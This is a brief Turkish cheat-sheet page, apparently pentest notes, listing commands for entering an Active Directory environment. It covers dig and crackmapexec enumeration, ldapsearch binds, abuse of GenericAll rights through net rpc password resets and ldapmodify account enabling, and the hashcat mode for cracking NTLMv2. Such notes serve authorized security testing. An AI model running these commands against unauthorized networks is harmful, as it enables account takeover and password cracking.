---
layout: page
title: "Linux"
permalink: /linux/ad-ortamina-giris/
---

```bash
dig any @ip hostname
```

```bash
crackmapexec smb IP-ADRESI -u Test1 -d test.local -p "Passwd123"
```

```bash
ldapsearch -x -H ldap://IP -D "username@hostname" -w "Passwd123" -b "" -s base
```


GenericAll Yetkisi varsa
```bash
net rpc password TARGETUSERNAME 'YeniParola123..' -U 'test.local/ElindekiKullanıcıAdı%ElindekiKullanıcınınŞifresi' -S dc.test.local

veya!!!!

net rpc user enable TARGETUSERNAME -U 'test.local/ElindekiKullanıcıAdı%ElindekiKullanıcınınŞifresi' -S dc.test.local
```

```bash
ldapmodify -x -H ldap://dc.test.local -D 'MevcutKullanıcı@test.local' -w 'Passwd123' <<EOF
dn: HEDEFLENEN KULLANICI DN
changetype: modify
replace: userAccountControl
userAccountControl: 512
EOF
 ile kullancııy etkilenştirir 514 inaktif demek.
```


ntlmv2 -> hashcat -m 5600 
